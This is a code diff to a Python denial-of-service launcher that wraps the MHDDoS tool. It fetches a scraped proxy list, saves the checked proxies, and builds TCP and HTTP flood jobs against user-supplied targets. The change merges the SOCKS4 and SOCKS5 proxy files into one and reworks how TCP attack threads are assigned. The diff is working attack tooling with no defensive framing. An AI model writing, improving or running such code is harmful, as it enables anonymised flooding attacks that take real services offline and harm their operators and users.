@@ -9,7 +9,7 @@ from multiprocessing import cpu_count
 
 import requests
 from MHDDoS.start import logger
-from PyRoxy import ProxyType, Proxy
+from PyRoxy import Proxy
 
 
 PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
@@ -101,16 +101,10 @@ def update_proxies(period, targets):
         exit()
 
     os.makedirs('files/proxies/', exist_ok=True)
-    with open('files/proxies/proxies.txt', "w") as all_wr, \
-            open('files/proxies/socks4.txt', "w") as socks4_wr, \
-            open('files/proxies/socks5.txt', "w") as socks5_wr:
+    with open('files/proxies/proxies.txt', 'w') as wr:
         for proxy in CheckedProxies:
-            proxy_string = str(proxy) + "\n"
-            all_wr.write(proxy_string)
-            if proxy.type == ProxyType.SOCKS4:
-                socks4_wr.write(proxy_string)
-            if proxy.type == ProxyType.SOCKS5:
-                socks5_wr.write(proxy_string)
+            proxy_string = str(proxy) + '\n'
+            wr.write(proxy_string)
 
 
 def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
@@ -126,10 +120,9 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
 
         # TCP
         elif target.lower().startswith('tcp://'):
-            for socks_type, socks_file in (('4', 'socks4.txt'), ('5', 'socks5.txt')):
-                params_list.append([
-                    'TCP', target[6:], str(threads_per_target // 2), str(period), socks_type, socks_file
-                ])
+            params_list.append([
+                'TCP', target[6:], str(threads_per_target), str(period), '0', 'proxies.txt'
+            ])
 
         # HTTP(S)
         else:
